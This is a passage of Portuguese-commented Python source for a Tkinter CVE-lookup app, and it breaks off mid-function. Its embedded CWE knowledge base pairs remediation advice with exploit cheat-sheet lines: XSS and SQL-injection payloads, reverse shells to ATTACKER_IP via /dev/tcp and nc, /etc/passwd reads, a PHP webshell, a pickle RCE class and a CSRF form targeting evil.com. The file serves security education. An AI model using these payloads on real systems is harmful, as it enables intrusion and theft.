import requests
import webbrowser
import threading
import datetime
import html
import platform
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog

class CVEInfoApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CVE Scanner de Vulnerabilidades")
        self.root.geometry("1050x850")
        self.root.configure(bg="#1a1a2e")
        self.root.resizable(True, True)

        try:
            if platform.system() == "Windows":
                self.root.after(100, lambda: self.root.state("zoomed"))
            else:
                self.root.after(200, lambda: self.root.attributes("-zoomed", True))
        except Exception:
            pass

        # Variáveis de controle
        self.referencias_links = []
        self.dados_atuais = {
            "cve_id": "",
            "descricao_orig": "",
            "descricao_pt": "",
            "cvss": "N/A",
            "nivel": "Indefinido",
            "cor_html": "#ffffff",
            "como_explorar": "",
            "como_corrigir": "",
            "resultado_completo": "",
            "produtos_afetados": [],
            "vetor_ataque": "",
            "cwe_id": "",
            "cwe_nome": "",
        }

        # Base de conhecimento de CWEs
        self.cwe_database = self.carregar_base_cwe()

        # Configurar interface
        self.configurar_estilos()
        self.criar_banner()
        self.criar_campo_busca()
        self.criar_notebook()
        self.criar_barra_status()

    def carregar_base_cwe(self):
        """
        Base de conhecimento local com tipos de vulnerabilidade,
        métodos de exploração e correções
        """
        return {
            "CWE-79": {
                "nome": "Cross-site Scripting (XSS)",
                "explorar": [
                    "1. REFLECTED XSS - Injetar script via parâmetros URL:",
                    "   Payload: <script>alert(document.cookie)</script>",
                    "   URL: https://alvo.com/busca?q=<script>alert(1)</script>",
                    "",
                    "2. STORED XSS - Inserir script em campos persistentes:",
                    "   Em comentários/formulários: <img src=x onerror=alert(1)>",
                    "   SVG injection: <svg onload=alert('XSS')>",
                    "",
                    "3. DOM-BASED XSS - Manipular o DOM do navegador:",
                    "   Payload: javascript:alert(document.domain)",
                    "   Via fragment: https://alvo.com/#<script>alert(1)</script>",
                    "",
                    "4. FERRAMENTAS ÚTEIS:",
                    "   • XSStrike: python xsstrike.py -u 'URL'",
                    "   • Dalfox: dalfox url 'URL'",
                    "   • Burp Suite - Scanner automático",
                    "   • OWASP ZAP - Scan ativo de XSS",
                ],
                "corrigir": [
                    "1. SANITIZAÇÃO DE ENTRADA (Input Validation):",
                    "   • Escapar caracteres HTML: < > \" ' & /",
                    "   • Usar bibliotecas: bleach (Python), DOMPurify (JS)",
                    "   • Exemplo Python Flask:",
                    "     from markupsafe import escape",
                    "     user_input = escape(request.args.get('q', ''))",
                    "",
                    "2. CONTENT SECURITY POLICY (CSP):",
                    "   Adicionar header HTTP:",
                    "   Content-Security-Policy: default-src 'self';",
                    "   script-src 'self' 'nonce-RANDOM';",
                    "",
                    "3. ENCODING DE SAÍDA (Output Encoding):",
                    "   • HTML Context: usar htmlspecialchars() / escape()",
                    "   • JavaScript Context: JSON.stringify()",
                    "   • URL Context: encodeURIComponent()",
                    "",
                    "4. FLAGS DE COOKIE:",
                    "   Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict",
                    "",
                    "5. FRAMEWORKS SEGUROS:",
                    "   • React - escapa automaticamente por padrão",
                    "   • Angular - sanitização automática",
                    "   • Django - auto-escape em templates",
                ],
            },
            "CWE-89": {
                "nome": "SQL Injection",
                "explorar": [
                    "1. DETECÇÃO BÁSICA - Testar campos de entrada:",
                    "   Payload: ' OR '1'='1' --",
                    "   Payload: ' UNION SELECT null,null,null --",
                    "   Payload: 1; DROP TABLE users --",
                    "",
                    "2. UNION-BASED SQLi - Extrair dados:",
                    "   ' UNION SELECT username,password FROM users --",
                    "   ' UNION SELECT table_name,null FROM information_schema.tables --",
                    "",
                    "3. BLIND SQLi - Quando não há retorno visual:",
                    "   Boolean: ' AND 1=1 -- (verdadeiro)",
                    "   Boolean: ' AND 1=2 -- (falso)",
                    "   Time-based: ' OR SLEEP(5) --",
                    "",
                    "4. FERRAMENTAS:",
                    "   • SQLMap: sqlmap -u 'URL?id=1' --dbs --batch",
                    "   • SQLMap avançado: sqlmap -u 'URL' --forms --crawl=2",
                    "   • Havij (Windows)",
                    "   • jSQL Injection",
                ],
                "corrigir": [
                    "1. PREPARED STATEMENTS (Consultas Parametrizadas):",
                    "   Python (sqlite3):",
                    "     cursor.execute('SELECT * FROM users WHERE id=?', (user_id,))",
                    "",
                    "   Python (psycopg2 - PostgreSQL):",
                    "     cursor.execute('SELECT * FROM users WHERE name=%s', (name,))",
                    "",
                    "   PHP (PDO):",
                    "     $stmt = $pdo->prepare('SELECT * FROM users WHERE id=:id');",
                    "     $stmt->execute(['id' => $userId]);",
                    "",
                    "   Java (JDBC):",
                    "     PreparedStatement ps = conn.prepareStatement(",
                    "       'SELECT * FROM users WHERE id=?');",
                    "     ps.setInt(1, userId);",
                    "",
                    "2. ORM (Object Relational Mapping):",
                    "   • SQLAlchemy (Python), Hibernate (Java), Eloquent (PHP)",
                    "",
                    "3. VALIDAÇÃO DE ENTRADA:",
                    "   • Whitelist de caracteres permitidos",
                    "   • Rejeitar caracteres especiais: ' \" ; -- /* */",
                    "",
                    "4. PRINCÍPIO DO MENOR PRIVILÉGIO:",
                    "   • Conta DB com permissões mínimas",
                    "   • Nunca usar 'root' ou 'sa' na aplicação",
                    "",
                    "5. WAF (Web Application Firewall):",
                    "   • ModSecurity com OWASP CRS",
                    "   • Cloudflare WAF",
                ],
            },
            "CWE-78": {
                "nome": "OS Command Injection",
                "explorar": [
                    "1. INJEÇÃO DIRETA DE COMANDOS:",
                    "   Campo de entrada: ; cat /etc/passwd",
                    "   Payload: | whoami",
                    "   Payload: && id",
                    "   Payload: `id`  (backticks)",
                    "",
                    "2. BYPASS DE FILTROS:",
                    "   Espaços: cat${IFS}/etc/passwd",
                    "   Encoding: c%61t+/etc/passwd",
                    "   Concatenação: c'a't /etc/passwd",
                    "",
                    "3. REVERSE SHELL:",
                    "   ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                    "   | nc ATTACKER_IP 4444 -e /bin/bash",
                    "",
                    "4. FERRAMENTAS:",
                    "   • Commix: commix --url='URL?ip=127.0.0.1'",
                    "   • Burp Suite - Repeater para testar payloads",
                ],
                "corrigir": [
                    "1. NUNCA USAR CHAMADAS DE SISTEMA COM INPUT DO USUÁRIO:",
                    "   EVITAR: os.system('ping ' + user_input)",
                    "   EVITAR: subprocess.call('ping ' + user_input, shell=True)",
                    "",
                    "2. USAR APIs ESPECÍFICAS em vez de comandos shell:",
                    "   Em vez de: os.system('ping ' + ip)",
                    "   Usar: subprocess.run(['ping', '-c', '1', ip], capture_output=True)",
                    "",
                    "3. VALIDAÇÃO RIGOROSA:",
                    "   import re",
                    "   if not re.match(r'^[0-9]{1,3}(\\.[0-9]{1,3}){3}$', ip):",
                    "       raise ValueError('IP inválido')",
                    "",
                    "4. SANDBOXING:",
                    "   • Containers Docker isolados",
                    "   • AppArmor / SELinux profiles",
                    "   • chroot jails",
                    "",
                    "5. WHITELIST DE COMANDOS PERMITIDOS:",
                    "   allowed_commands = {'ping', 'traceroute', 'nslookup'}",
                ],
            },
            "CWE-22": {
                "nome": "Path Traversal",
                "explorar": [
                    "1. TRAVESSIA DE DIRETÓRIO BÁSICA:",
                    "   URL: /download?file=../../../etc/passwd",
                    "   URL: /image?path=....//....//....//etc/shadow",
                    "",
                    "2. BYPASS DE FILTROS:",
                    "   Double encoding: %252e%252e%252f",
                    "   Unicode: ..%c0%af..%c0%af",
                    "   Null byte: ../../../etc/passwd%00.jpg",
                    "",
                    "3. WINDOWS PATHS:",
                    "   ..\\..\\..\\windows\\system32\\config\\SAM",
                    "   ....\\\\....\\\\windows\\win.ini",
                    "",
                    "4. FERRAMENTAS:",
                    "   • DotDotPwn: dotdotpwn -m http -h TARGET",
                    "   • Burp Suite Intruder com wordlists de traversal",
                ],
                "corrigir": [
                    "1. VALIDAÇÃO DE CAMINHO:",
                    "   import os",
                    "   base_dir = '/var/www/uploads/'",
                    "   requested = os.path.join(base_dir, user_file)",
                    "   real_path = os.path.realpath(requested)",
                    "   if not real_path.startswith(base_dir):",
                    "       raise PermissionError('Acesso negado')",
                    "",
                    "2. WHITELIST DE ARQUIVOS:",
                    "   allowed_files = {'logo.png', 'readme.txt'}",
                    "   if filename not in allowed_files:",
                    "       abort(403)",
                    "",
                    "3. CHROOT / JAIL:",
                    "   • Isolar diretório de uploads",
                    "   • Permissões mínimas no filesystem",
                    "",
                    "4. REMOVER CARACTERES PERIGOSOS:",
                    "   filename = filename.replace('..', '')",
                    "   filename = os.path.basename(filename)",
                ],
            },
            "CWE-287": {
                "nome": "Improper Authentication",
                "explorar": [
                    "1. BRUTE FORCE DE CREDENCIAIS:",
                    "   • Hydra: hydra -l admin -P wordlist.txt TARGET http-post-form",
                    "   • Medusa: medusa -h TARGET -u admin -P wordlist.txt -M http",
                    "",
                    "2. BYPASS DE AUTENTICAÇÃO:",
                    "   • SQL Injection no login: admin' OR '1'='1",
                    "   • Manipulação de tokens JWT",
                    "   • Forçar acesso direto a URLs protegidas",
                    "",
                    "3. SESSION HIJACKING:",
                    "   • Roubo de cookies via XSS",
                    "   • Session fixation",
                    "   • Sniffing em redes sem HTTPS",
                    "",
                    "4. FERRAMENTAS:",
                    "   • Burp Suite - Intruder para brute force",
                    "   • jwt_tool: python3 jwt_tool.py TOKEN",
                    "   • Hashcat para crackear hashes",
                ],
                "corrigir": [
                    "1. AUTENTICAÇÃO MULTI-FATOR (MFA):",
                    "   • TOTP (Google Authenticator)",
                    "   • SMS/Email como segundo fator",
                    "   • Chaves FIDO2/WebAuthn",
                    "",
                    "2. RATE LIMITING:",
                    "   • Limitar tentativas de login (ex: 5 por minuto)",
                    "   • Implementar CAPTCHA após falhas",
                    "   • Account lockout temporário",
                    "",
                    "3. HASHING SEGURO DE SENHAS:",
                    "   import bcrypt",
                    "   hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())",
                    "",
                    "4. SESSÕES SEGURAS:",
                    "   • Regenerar session ID após login",
                    "   • Timeout de sessão (15-30 min)",
                    "   • Cookies HttpOnly + Secure + SameSite",
                    "",
                    "5. OAUTH2 / OpenID Connect:",
                    "   • Delegar autenticação para provedores confiáveis",
                ],
            },
            "CWE-119": {
                "nome": "Buffer Overflow",
                "explorar": [
                    "1. STACK-BASED BUFFER OVERFLOW:",
                    "   • Enviar input maior que o buffer alocado",
                    "   • Payload: 'A' * 1000 + shellcode",
                    "   • Sobrescrever return address (EIP/RIP)",
                    "",
                    "2. HEAP-BASED OVERFLOW:",
                    "   • Corromper metadados do heap",
                    "   • Use-after-free exploitation",
                    "",
                    "3. FERRAMENTAS DE ANÁLISE:",
                    "   • GDB + PEDA/GEF: gdb ./programa",
                    "   • Ghidra - Engenharia reversa",
                    "   • IDA Pro - Disassembler",
                    "   • pwntools (Python): from pwn import *",
                    "",
                    "4. CRIAR EXPLOIT:",
                    "   • pattern_create.rb -l 500 (Metasploit)",
                    "   • Identificar offset do EIP",
                    "   • Gerar shellcode: msfvenom -p linux/x86/shell_reverse_tcp",
                ],
                "corrigir": [
                    "1. FUNÇÕES SEGURAS (substituir funções vulneráveis):",
                    "   EVITAR → USAR:",
                    "   strcpy()  → strncpy() / strlcpy()",
                    "   sprintf() → snprintf()",
                    "   gets()    → fgets()",
                    "   scanf()   → fgets() + sscanf()",
                    "",
                    "2. PROTEÇÕES DO COMPILADOR:",
                    "   gcc -fstack-protector-strong  (Stack Canaries)",
                    "   gcc -D_FORTIFY_SOURCE=2       (Fortify)",
                    "   gcc -pie -fPIE                (ASLR/PIE)",
                    "   gcc -z relro -z now            (RELRO)",
                    "",
                    "3. ASLR (Address Space Layout Randomization):",
                    "   echo 2 > /proc/sys/kernel/randomize_va_space",
                    "",
                    "4. USAR LINGUAGENS MEMORY-SAFE:",
                    "   • Rust (ownership + borrow checker)",
                    "   • Go (garbage collector)",
                    "   • Python, Java, C# (managed memory)",
                    "",
                    "5. ANÁLISE ESTÁTICA:",
                    "   • Coverity, Checkmarx, SonarQube",
                    "   • Valgrind: valgrind --tool=memcheck ./programa",
                ],
            },
            "CWE-200": {
                "nome": "Information Exposure / Disclosure",
                "explorar": [
                    "1. ENUMERAÇÃO DE INFORMAÇÕES:",
                    "   • Acessar /robots.txt, /.env, /config.php.bak",
                    "   • Headers HTTP revelam versões do servidor",
                    "   • Mensagens de erro detalhadas (stack traces)",
                    "",
                    "2. DIRECTORY LISTING:",
                    "   • Navegar em diretórios sem index",
                    "   • Ferramentas: dirsearch, gobuster, ffuf",
                    "",
                    "3. METADATA DE ARQUIVOS:",
                    "   • exiftool documento.pdf (extrai metadados)",
                    "   • FOCA - extração de metadados em massa",
                    "",
                    "4. GOOGLE DORKS:",
                    "   • site:alvo.com filetype:sql",
                    "   • site:alvo.com inurl:admin",
                    "   • intitle:'index of' site:alvo.com",
                ],
                "corrigir": [
                    "1. DESABILITAR INFORMAÇÕES SENSÍVEIS:",
                    "   • Remover headers: Server, X-Powered-By",
                    "   • Apache: ServerTokens Prod / ServerSignature Off",
                    "   • Nginx: server_tokens off;",
                    "",
                    "2. PÁGINAS DE ERRO GENÉRICAS:",
                    "   • Nunca mostrar stack traces em produção",
                    "   • Debug=False em frameworks (Django, Flask)",
                    "",
                    "3. PROTEGER ARQUIVOS SENSÍVEIS:",
                    "   • .htaccess: Deny from all para .env, .git",
                    "   • Nginx: location ~ /\\. { deny all; }",
                    "",
                    "4. CONTROLE DE ACESSO:",
                    "   • Desabilitar directory listing",
                    "   • Apache: Options -Indexes",
                ],
            },
            "CWE-352": {
                "nome": "Cross-Site Request Forgery (CSRF)",
                "explorar": [
                    "1. CSRF BÁSICO - Formulário malicioso:",
                    "   <form action='https://banco.com/transferir' method='POST'>",
                    "     <input type='hidden' name='para' value='atacante'>",
                    "     <input type='hidden' name='valor' value='10000'>",
                    "   </form>",
                    "   <script>document.forms[0].submit()</script>",
                    "",
                    "2. CSRF VIA IMAGEM (GET):",
                    "   <img src='https://alvo.com/delete?id=1' />",
                    "",
                    "3. CSRF COM AJAX:",
                    "   fetch('https://alvo.com/api/change-email', {",
                    "     method: 'POST', credentials: 'include',",
                    "     body: 'email=atacante@evil.com'",
                    "   });",
                    "",
                    "4. FERRAMENTAS:",
                    "   • Burp Suite - CSRF PoC Generator",
                    "   • CSRFTester",
                ],
                "corrigir": [
                    "1. TOKEN CSRF (Anti-CSRF Token):",
                    "   • Gerar token único por sessão/request",
                    "   • Django: {% csrf_token %} (automático)",
                    "   • Flask: flask-wtf CSRFProtect",
                    "",
                    "2. SAMESITE COOKIES:",
                    "   Set-Cookie: session=abc; SameSite=Strict; Secure",
                    "",
                    "3. VERIFICAR HEADER ORIGIN/REFERER:",
                    "   • Validar que Origin/Referer é do próprio domínio",
                    "",
                    "4. DOUBLE SUBMIT COOKIE:",
                    "   • Enviar token no cookie E no body/header",
                    "   • Comparar ambos no servidor",
                    "",
                    "5. AÇÕES SENSÍVEIS:",
                    "   • Exigir re-autenticação para operações críticas",
                    "   • CAPTCHA em formulários importantes",
                ],
            },
            "CWE-434": {
                "nome": "Unrestricted Upload of File",
                "explorar": [
                    "1. UPLOAD DE WEBSHELL:",
                    "   • Renomear shell.php para shell.php.jpg",
                    "   • Interceptar request e mudar Content-Type",
                    "   • Double extension: shell.php.png",
                    "",
                    "2. BYPASS DE VALIDAÇÃO:",
                    "   • Null byte: shell.php%00.jpg",
                    "   • Case: shell.pHp",
                    "   • Extensões alternativas: .php5, .phtml, .shtml",
                    "",
                    "3. WEBSHELLS COMUNS:",
                    "   PHP: <?php system($_GET['cmd']); ?>",
                    "   JSP: Runtime.getRuntime().exec(request.getParameter('c'))",
                    "",
                    "4. FERRAMENTAS:",
                    "   • Weevely: weevely generate password shell.php",
                    "   • Burp Suite para manipular uploads",
                ],
                "corrigir": [
                    "1. VALIDAÇÃO NO SERVIDOR:",
                    "   • Verificar MIME type real (magic bytes)",
                    "   • Whitelist de extensões: .jpg, .png, .pdf",
                    "   • Verificar conteúdo do arquivo, não só extensão",
                    "",
                    "2. RENOMEAR ARQUIVOS:",
                    "   import uuid",
                    "   new_name = f'{uuid.uuid4()}.{allowed_ext}'",
                    "",
                    "3. ARMAZENAMENTO SEGURO:",
                    "   • Salvar FORA do webroot",
                    "   • Servir via proxy sem execução",
                    "   • Usar CDN/S3 para arquivos estáticos",
                    "",
                    "4. LIMITAR TAMANHO:",
                    "   • Máximo de 5-10MB por arquivo",
                    "   • Rate limiting de uploads",
                    "",
                    "5. DESABILITAR EXECUÇÃO NO DIRETÓRIO:",
                    "   Apache: php_flag engine off",
                    "   Nginx: location /uploads { deny all; }",
                ],
            },
            "CWE-306": {
                "nome": "Missing Authentication for Critical Function",
                "explorar": [
                    "1. ACESSO DIRETO A ENDPOINTS:",
                    "   • Testar /admin, /api/users, /backup sem login",
                    "   • Fuzzing de URLs: ffuf -u URL/FUZZ -w wordlist",
                    "",
                    "2. IDOR (Insecure Direct Object Reference):",
                    "   • Mudar /api/user/1 para /api/user/2",
                    "   • Acessar dados de outros usuários",
                    "",
                    "3. FERRAMENTAS:",
                    "   • Burp Suite - Autorize extension",
                    "   • OWASP ZAP - Access Control Testing",
                ],
                "corrigir": [
                    "1. AUTENTICAÇÃO EM TODOS OS ENDPOINTS:",
                    "   • Middleware/Decorator de autenticação",
                    "   • @login_required (Django/Flask)",
                    "",
                    "2. AUTORIZAÇÃO BASEADA EM ROLES:",
                    "   • RBAC (Role-Based Access Control)",
                    "   • Verificar permissões em cada request",
                    "",
                    "3. TESTES DE ACESSO:",
                    "   • Testar com usuário não autenticado",
                    "   • Testar com usuário de baixo privilégio",
                ],
            },
            "CWE-502": {
                "nome": "Deserialization of Untrusted Data",
                "explorar": [
                    "1. JAVA DESERIALIZATION:",
                    "   • ysoserial: java -jar ysoserial.jar CommonsCollections1 'cmd'",
                    "",
                    "2. PYTHON PICKLE:",
                    "   import pickle, os",
                    "   class Exploit:",
                    "       def __reduce__(self):",
                    "           return (os.system, ('whoami',))",
                    "   pickle.dumps(Exploit())",
                    "",
                    "3. PHP DESERIALIZATION:",
                    "   • PHPGGC: phpggc Laravel/RCE1 system 'id'",
                    "",
                    "4. FERRAMENTAS:",
                    "   • ysoserial (Java)",
                    "   • PHPGGC (PHP)",
                    "   • Burp Deserialization Scanner",
                ],
                "corrigir": [
                    "1. NUNCA DESERIALIZAR DADOS NÃO CONFIÁVEIS:",
                    "   • Usar JSON em vez de serialização nativa",
                    "   • Python: json.loads() em vez de pickle.loads()",
                    "",
                    "2. ASSINATURA DIGITAL:",
                    "   • HMAC nos dados serializados",
                    "   • Verificar integridade antes de deserializar",
                    "",
                    "3. WHITELIST DE CLASSES:",
                    "   • Java: ObjectInputFilter",
                    "   • Permitir apenas classes esperadas",
                    "",
                    "4. ATUALIZAR BIBLIOTECAS:",
                    "   • Apache Commons Collections atualizado",
                    "   • Remover gadget chains conhecidas",
                ],
            },
        }

    def configurar_estilos(self):
        """Configura os estilos visuais ttk"""
        style = ttk.Style()
        style.theme_use("clam")

        style.configure("Buscar.TButton", background="#00d4ff", foreground="#000000",
                        font=("Consolas", 11, "bold"), padding=(15, 8))
        style.map("Buscar.TButton", background=[("active", "#00ff88"), ("pressed", "#0099cc")])

        style.configure("Limpar.TButton", background="#ff4444", foreground="#000000",
                        font=("Consolas", 10, "bold"), padding=(12, 8))
        style.map("Limpar.TButton", background=[("active", "#ff6666"), ("pressed", "#cc3333")])

        style.configure("Salvar.TButton", background="#00ff88", foreground="#000000",
                        font=("Consolas", 10, "bold"), padding=(12, 8))
        style.map("Salvar.TButton", background=[("active", "#00cc66"), ("pressed", "#009944")])

        style.configure("Exploit.TButton", background="#ff00ff", foreground="#000000",
                        font=("Consolas", 10, "bold"), padding=(12, 8))
        style.map("Exploit.TButton", background=[("active", "#ff66ff"), ("pressed", "#cc00cc")])

    def criar_banner(self):
        """Banner superior"""
        banner_frame = tk.Frame(self.root, bg="#1a1a2e")
        banner_frame.pack(fill="x", padx=10, pady=(10, 5))

        banner_text = """
 ██████╗██╗   ██╗███████╗    ██╗███╗   ██╗███████╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗
██║     ██║   ██║█████╗      ██║██╔██╗ ██║█████╗  ██║   ██║
██║     ╚██╗ ██╔╝██╔══╝      ██║██║╚██╗██║██╔══╝  ██║   ██║
╚██████╗ ╚████╔╝ ███████╗    ██║██║ ╚████║██║     ╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝"""

        tk.Label(banner_frame, text=banner_text, font=("Consolas", 7),
                 fg="#00d4ff", bg="#1a1a2e", justify="center").pack()
        tk.Label(banner_frame, text="🔍 Scanner de Vulnerabilidades CVE + Exploit & Fix Guide",
                 font=("Consolas", 11, "bold"), fg="#00ff88", bg="#1a1a2e").pack(pady=(0, 5))

    def criar_campo_busca(self):
        """Barra de pesquisa e botões"""
        busca_frame = tk.Frame(self.root, bg="#16213e", relief="ridge", bd=2)
        busca_frame.pack(fill="x", padx=15, pady=5)

        tk.Label(busca_frame, text="📋 CVE (ex: 2021-44228):", font=("Consolas", 11, "bold"),
                 fg="#00d4ff", bg="#16213e").pack(side="left", padx=(15, 10), pady=10)

        self.entry_cve = tk.Entry(busca_frame, font=("Consolas", 12, "bold"), bg="#0f3460",
                                  fg="#00ff88", insertbackground="#00ff88", relief="flat",
                                  width=18, justify="center")
        self.entry_cve.pack(side="left", padx=5, pady=10, ipady=4)
        self.entry_cve.bind("<Return>", lambda e: self.iniciar_busca())
        self.entry_cve.focus()

        ttk.Button(busca_frame, text="🔍 BUSCAR", style="Buscar.TButton",
                   command=self.iniciar_busca).pack(side="left", padx=4, pady=10)
        ttk.Button(busca_frame, text="🗑 LIMPAR", style="Limpar.TButton",
                   command=self.limpar_tudo).pack(side="left", padx=4, pady=10)
        ttk.Button(busca_frame, text="💾 SALVAR HTML", style="Salvar.TButton",
                   command=self.gerar_html).pack(side="left", padx=4, pady=10)
        ttk.Button(busca_frame, text="💀 EXPLOIT-DB", style="Exploit.TButton",
                   command=self.buscar_exploit_db).pack(side="left", padx=4, pady=10)

    def criar_notebook(self):
        """Cria abas para organizar informações"""
        style = ttk.Style()
        style.configure("Custom.TNotebook", background="#1a1a2e")
        style.configure("Custom.TNotebook.Tab", background="#16213e", foreground="#00d4ff",
                        font=("Consolas", 10, "bold"), padding=(12, 6))
        style.map("Custom.TNotebook.Tab", background=[("selected", "#0f3460")],
                  foreground=[("selected", "#00ff88")])

        self.notebook = ttk.Notebook(self.root, style="Custom.TNotebook")
        self.notebook.pack(fill="both", expand=True, padx=15, pady=5)

        # Aba 1: Resultados
        tab_resultado = tk.Frame(self.notebook, bg="#1a1a2e")
        self.notebook.add(tab_resultado, text=" 📊 Resultado ")
        self.text_resultado = scrolledtext.ScrolledText(
            tab_resultado, font=("Consolas", 10), bg="#0a0a1a", fg="#ffffff",
            insertbackground="#00ff88", relief="flat", wrap="word", state="disabled")
        self.text_resultado.pack(fill="both", expand=True, padx=5, pady=5)
        self.configurar_tags(self.text_resultado)

        # Aba 2: Como Explorar
        tab_exploit = tk.Frame(self.notebook, bg="#1a1a2e")
        self.notebook.add(tab_exploit, text=" 💀 Como Explorar ")
        self.text_exploit = scrolledtext.ScrolledText(
            tab_exploit, font=("Consolas", 10), bg="#0a0a1a", fg="#ffffff",
            insertbackground="#ff0000", relief="flat", wrap="word", state="disabled")
        self.text_exploit.pack(fill="both", expand=True, padx=5, pady=5)
        self.configurar_tags(self.text_exploit)

        # Aba 3: Como Corrigir
        tab_fix = tk.Frame(self.notebook, bg="#1a1a2e")
        self.notebook.add(tab_fix, text=" 🛡 Como Corrigir ")
        self.text_fix = scrolledtext.ScrolledText(
            tab_fix, font=("Consolas", 10), bg="#0a0a1a", fg="#ffffff",
            insertbackground="#00ff88", relief="flat", wrap="word", state="disabled")
        self.text_fix.pack(fill="both", expand=True, padx=5, pady=5)
        self.configurar_tags(self.text_fix)

        # Aba 4: Referências
        tab_refs = tk.Frame(self.notebook, bg="#1a1a2e")
        self.notebook.add(tab_refs, text=" 🔗 Referências ")
        canvas_frame = tk.Frame(tab_refs, bg="#1a1a2e")
        canvas_frame.pack(fill="both", expand=True, padx=5, pady=5)

        self.canvas = tk.Canvas(canvas_frame, bg="#0a0a1a", highlightthickness=0)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.canvas.yview)

        self.refs_container = tk.Frame(self.canvas, bg="#0a0a1a")
        self.refs_container.bind("<Configure>",
                                 lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))

        self.canvas.create_window((0, 0), window=self.refs_container, anchor="nw")
        self.canvas.configure(yscrollcommand=scrollbar.set)
        self.canvas.bind_all("<MouseWheel>",
                             lambda e: self.canvas.yview_scroll(int(-1 * (e.delta / 120)), "units"))
        self.canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

    def configurar_tags(self, widget):
        """Tags de formatação reutilizáveis"""
        widget.tag_configure("titulo", foreground="#00d4ff", font=("Consolas", 12, "bold"))
        widget.tag_configure("subtitulo", foreground="#ffcc00", font=("Consolas", 11, "bold"))
        widget.tag_configure("valor", foreground="#00ff88", font=("Consolas", 10))
        widget.tag_configure("descricao", foreground="#00ddff", font=("Consolas", 10))
        widget.tag_configure("traducao", foreground="#00ff88", font=("Consolas", 10, "bold"))
        widget.tag_configure("erro", foreground="#ff4444", font=("Consolas", 10, "bold"))
        widget.tag_configure("separador", foreground="#ff66ff", font=("Consolas", 10, "bold"))
        widget.tag_configure("critico", foreground="#ff00ff", font=("Consolas", 12, "bold"))
        widget.tag_configure("alto", foreground="#ff4444", font=("Consolas", 12, "bold"))
        widget.tag_configure("medio", foreground="#ffcc00", font=("Consolas", 12, "bold"))
        widget.tag_configure("baixo", foreground="#00d4ff", font=("Consolas", 12, "bold"))
        widget.tag_configure("nenhum", foreground="#ffffff", font=("Consolas", 12, "bold"))
        widget.tag_configure("codigo", foreground="#ff9944", font=("Consolas", 10))
        widget.tag_configure("aviso", foreground="#ff6600", font=("Consolas", 10, "bold"))
        widget.tag_configure("destaque", foreground="#ff00ff", font=("Consolas", 10, "bold"))
        widget.tag_configure("ferramenta", foreground="#00ffcc", font=("Consolas", 10, "bold"))
        widget.tag_configure("passo", foreground="#ffcc00", font=("Consolas", 10, "bold"))

    def criar_barra_status(self):
        """Barra de status no rodapé"""
        self.status_var = tk.StringVar(value="Pronto para buscar...")
        tk.Label(self.root, textvariable=self.status_var, font=("Consolas", 9),
                 fg="#00ff88", bg="#0f3460", anchor="w", relief="sunken", bd=1).pack(fill="x", side="bottom")

    # ── Métodos de inserção e limpeza ──

    def inserir_texto(self, texto, tag="valor", widget=None):
        if widget is None:
            widget = self.text_resultado
        widget.config(state="normal")
        widget.insert("end", texto, tag)
        widget.config(state="disabled")
        widget.see("end")

    def limpar_widget(self, widget):
        widget.config(state="normal")
        widget.delete("1.0", "end")
        widget.config(state="disabled")

    def obter_texto_completo(self, widget):
        return widget.get("1.0", "end").strip()

    def limpar_resultados(self):
        self.limpar_widget(self.text_resultado)
        self.limpar_widget(self.text_exploit)
        self.limpar_widget(self.text_fix)

    def limpar_referencias(self):
        for widget in self.refs_container.winfo_children():
            widget.destroy()
        self.referencias_links.clear()

    def limpar_tudo(self):
        self.entry_cve.delete(0, "end")
        self.limpar_resultados()
        self.limpar_referencias()
        self.dados_atuais = {
            "cve_id": "", "descricao_orig": "", "descricao_pt": "",
            "cvss": "N/A", "nivel": "Indefinido", "cor_html": "#ffffff",
            "como_explorar": "", "como_corrigir": "", "resultado_completo": "",
            "produtos_afetados": [], "vetor_ataque": "", "cwe_id": "", "cwe_nome": "",
        }
        self.status_var.set("Limpo. Pronto para nova busca...")
        self.notebook.select(0)
        self.entry_cve.focus()

    def abrir_url(self, url):
        try:
            webbrowser.open(url)
            self.status_var.set(f"🌐 Abrindo: {url}")
        except Exception as e:
            messagebox.showerror("Erro", f"Não foi possível abrir o link:\n{e}")

    def buscar_exploit_db(self):
        """Busca no Exploit-DB pelo CVE atual"""
        cve_id = self.dados_atuais.get("cve_id", "")
        if not cve_id:
            cve_id = self.entry_cve.get().strip().upper()
            if cve_id.startswith("CVE-"):
                cve_id = cve_id[4:]
        if not cve_id:
            messagebox.showwarning("Atenção", "Digite ou busque um CVE primeiro!")
            return
        url = f"https://www.exploit-db.com/search?cve={cve_id}"
        self.abrir_url(url)
        self.status_var.set(f"🌐 Buscando exploits para CVE-{cve_id} no Exploit-DB")

    def traduzir_texto_nativo(self, texto):
        """Traduz texto com fallback triplo"""
        if not texto or not texto.strip():
            return "Descrição não disponível."

        def fatiar_texto(t, limite=400):
            palavras = t.split()
            blocos, atual, tamanho = [], [], 0
            for p in palavras:
                if tamanho + len(p) + 1 > limite:
                    blocos.append(" ".join(atual))
                    atual, tamanho = [p], len(p)
                else:
                    atual.append(p)
                    tamanho += len(p) + 1
            if atual:
                blocos.append(" ".join(atual))
            return blocos

        blocos = fatiar_texto(texto)
        traducao_final = []

        for bloco in blocos:
            traduzido = None

            # 1ª: Google Translate
            try:
                url_g = "https://translate.googleapis.com/translate_a/single"
                params_g = {"client": "gtx", "sl": "en", "tl": "pt", "dt": "t", "q": bloco}
                headers_g = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                             "Referer": "https://translate.google.com/"}
                res = requests.get(url_g, params=params_g, headers=headers_g, timeout=5)
                if res.status_code == 200:
                    dados = res.json()
                    traduzido = "".join([p[0] for p in dados[0] if p and p[0]])
            except Exception:
                pass

            # 2ª: MyMemory
            if not traduzido:
                try:
                    url_m = "https://api.mymemory.translated.net/get"
                    params_m = {"q": bloco, "langpair": "en|pt-BR"}
